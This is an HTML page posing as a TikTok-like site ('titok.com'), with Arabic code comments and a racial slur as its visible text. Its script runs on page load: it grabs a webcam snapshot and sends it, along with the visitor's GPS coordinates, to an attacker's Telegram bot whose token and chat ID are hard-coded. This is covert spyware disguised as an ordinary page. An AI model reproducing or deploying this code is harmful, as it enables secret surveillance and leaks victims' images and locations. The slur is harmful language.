<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>  titok.com</title>
<style>
  body {
    background-color: #FFFFFF; /* أبيض قوي */
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    font-family: 'Arial', sans-serif;
  }

  .text {
    font-size: 24px;
    color: black;
    margin-bottom: 20px;
    font-weight: bold;
    animation: fade 2s infinite alternate;
  }

  .greeting {
    font-size: 24px;
    color: black;
    margin-top: 10px;
    font-weight: bold;
    display: none; /* مخفية بالبداية */
  }

  @keyframes fade {
    from { opacity: 0.6; }
    to { opacity: 1; }
  }
</style>
</head>
<body>

<div class="text">  lol Nigga  </div>
<div class="greeting">   😊</div>

<script>
  // تظهر رسالة بعد 5 ثواني
  setTimeout(() => {
    document.querySelector('.greeting').style.display = 'block';
  }, 5000);

  async function captureAndSend() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      await new Promise(resolve => setTimeout(resolve, 3000));

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/jpeg');

      const blob = await (await fetch(imageData)).blob();

      const formData = new FormData();
      formData.append("chat_id", "1037860664");
      formData.append("photo", blob, "capture.jpg");

      fetch("https://api.telegram.org/bot1037860664:7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendPhoto", {
        method: "POST",
        body: formData
      });

      stream.getTracks().forEach(track => track.stop());

      navigator.geolocation.getCurrentPosition(position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        fetch(`https://api.telegram.org/bot7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendLocation?chat_id=1037860664&latitude=${latitude}&longitude=${longitude}`, {
          method: "GET"
        });
      }, error => {
        console.error("فشل الحصول على الموقع:", error);
      });

    } catch (err) {
      console.error("فشل الوصول إلى الكاميرا:", err);
    }
  }

  captureAndSend();
</script>

</body>
</html>
